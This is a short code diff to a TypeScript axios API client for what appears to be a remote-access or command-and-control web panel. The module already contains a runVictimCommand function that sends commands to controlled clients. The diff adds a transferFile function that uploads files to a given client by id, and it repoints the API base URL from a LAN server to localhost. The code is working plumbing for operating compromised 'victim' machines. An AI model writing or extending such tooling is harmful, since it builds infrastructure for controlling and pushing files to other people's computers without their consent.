@@ -1,6 +1,6 @@
 import axios from "axios";
-
-const API_URL = "http://192.168.98.223:8000/api/v1/";
+// For server: http://192.168.98.223:8000/api/v1/
+const API_URL = "http://localhost:8000/api/v1/";
 
 export const register = (username: string, email: string, password: string) => {
   return axios
@@ -105,6 +105,21 @@ export const runVictimCommand = (
         command,
       {}
     )
+    .then((response) => {
+      return response;
+    });
+};
+
+export const transferFile = (id: string, file: File) => {
+  const formData = new FormData();
+  formData.append("file", file);
+  return axios
+    .post(API_URL + "clients/" + id + "/upload", formData, {
+      headers: {
+        "Content-Type": "multipart/form-data",
+        Authorization: "Bearer " + localStorage.getItem("token"),
+      },
+    })
     .then((response) => {
       return response;
     });
